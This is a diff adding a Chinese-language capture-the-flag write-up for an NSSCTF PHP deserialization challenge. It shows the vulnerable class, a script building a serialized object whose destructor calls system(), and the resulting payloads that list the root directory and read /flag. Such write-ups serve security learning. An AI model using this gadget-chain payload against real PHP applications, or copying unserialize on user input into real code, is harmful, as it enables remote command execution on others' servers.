@@ -243,3 +243,66 @@ wqh[]=1&dsy[]=2
 http://www1.zmjd100.com/hotel/pc/1283140?checkIn=2023-07-26\&checkOut=2023-07-27
 
 02886112888
+
+### 1z\_unserialize
+
+```php
+<?php
+class lyh{
+    public $url = 'NSSCTF.com';
+    public $lt;
+    public $lly;
+     
+     function  __destruct()
+     {
+        $a = $this->lt;
+        $a($this->lly);
+     }
+}
+unserialize($_POST['nss']);
+highlight_file(__FILE__);
+?> 
+```
+
+构造序列化
+
+```php
+<?php
+class lyh{
+    public $url = 'NSSCTF.com';
+    public $lt;
+    public $lly;
+     
+     function  __destruct()
+     {
+        $a = $this->lt;
+        $a($this->lly);
+     }
+}
+$a = new lyh();
+$a->lt = 'system';
+$a->lly = 'ls /';
+echo serialize($a);
+// O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}
+?> 
+```
+
+构造 Payload 如下
+
+```
+nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}
+```
+
+回显如下
+
+```
+bin boot dev etc flag home lib lib64 media mnt opt proc root run run.sh sbin srv sys tmp usr var
+```
+
+构造 Payload 如下
+
+```
+nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
+```
+
+回显就是 flag 。
